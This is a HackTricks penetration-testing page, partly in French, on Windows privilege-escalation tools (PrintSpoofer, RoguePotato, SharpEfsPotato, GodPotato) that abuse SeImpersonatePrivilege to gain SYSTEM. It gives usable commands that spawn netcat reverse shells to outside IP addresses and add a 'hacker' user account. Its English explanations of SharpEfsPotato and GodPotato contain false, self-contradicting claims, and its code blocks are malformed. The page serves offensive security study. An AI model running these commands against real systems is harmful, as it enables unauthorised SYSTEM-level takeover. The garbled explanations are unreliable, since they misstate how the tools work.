# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
**JuicyPotato ne fonctionne pas** sur Windows Server 2019 et Windows 10 build 1809 et ultérieurs. Cependant, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) peuvent être utilisés pour **exploiter les mêmes privilèges et obtenir un accès de niveau `NT AUTHORITY\SYSTEM`**. Cet [article de blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) approfondit l'outil `PrintSpoofer`, qui peut être utilisé pour abuser des privilèges d'usurpation sur les hôtes Windows 10 et Server 2019 où JuicyPotato ne fonctionne plus.
{% endhint %}

## Démo rapide

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
### RoguePotato

{% code overflow="wrap" %}
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
{% code %}

### SharpEfsPotato

SharpEfsPotato is a tool that exploits the EFS (Encrypting File System) service in Windows to achieve local privilege escalation. It leverages the "EFSRPC" protocol to communicate with the EFS service and execute arbitrary commands with SYSTEM privileges.

#### Usage

To use SharpEfsPotato, follow these steps:

1. Compile the source code using Visual Studio or use the precompiled binary available on GitHub.
2. Execute the tool with the following command:

```plaintext
SharpEfsPotato.exe <command>
```

Replace `<command>` with the command you want to execute with SYSTEM privileges.

#### Example

Here's an example of using SharpEfsPotato to execute a command:

```plaintext
SharpEfsPotato.exe "cmd.exe /c net user hacker Password123! /add"
```

This command will create a new user named "hacker" with the password "Password123!".

#### Limitations

SharpEfsPotato has the following limitations:

- It requires administrative privileges to execute.
- It only works on Windows systems that have the EFS service enabled.
- It may trigger security alerts and be detected by antivirus software.

#### Mitigation

To mitigate the risk of SharpEfsPotato and similar attacks, consider the following measures:

- Disable the EFS service if it is not needed.
- Regularly update and patch your Windows systems.
- Use strong passwords and implement multi-factor authentication.
- Employ security solutions that can detect and prevent privilege escalation attacks.

{% endcode %}
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### GodPotato

GodPotato is a local privilege escalation technique that takes advantage of the Windows Print Spooler service. It combines the RoguePotato and PrintSpoofer exploits to gain SYSTEM-level privileges on a target machine.

The Print Spooler service is responsible for managing print jobs on a Windows system. By default, it runs with SYSTEM privileges, making it an attractive target for privilege escalation.

RoguePotato is a technique that abuses the COM Server Service to escalate privileges. It allows an attacker to create a malicious COM object that runs with elevated privileges. By combining RoguePotato with PrintSpoofer, an attacker can create a rogue print server that executes arbitrary code with SYSTEM privileges.

PrintSpoofer is a tool that exploits a vulnerability in the Print Spooler service to execute arbitrary code with SYSTEM privileges. It takes advantage of the "Impersonate Printer Driver" feature, which allows non-administrative users to install printer drivers. By exploiting this feature, an attacker can execute code with elevated privileges.

To perform a GodPotato attack, an attacker needs to have local access to the target machine. They start by creating a malicious COM object using RoguePotato. This object will be used to execute arbitrary code with SYSTEM privileges.

Next, the attacker uses PrintSpoofer to create a rogue print server. This server will be used to execute the malicious code created with RoguePotato. By exploiting the vulnerability in the Print Spooler service, the attacker can execute the code with SYSTEM privileges.

Once the attack is successful, the attacker will have full control over the target machine with SYSTEM-level privileges. This can allow them to perform various malicious activities, such as installing backdoors, stealing sensitive information, or pivoting to other machines on the network.

To protect against GodPotato attacks, it is recommended to apply the latest security patches and updates to the Windows operating system. Additionally, disabling the Print Spooler service if it is not needed can help mitigate the risk. Regular monitoring and auditing of system logs can also help detect any suspicious activities related to privilege escalation.
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
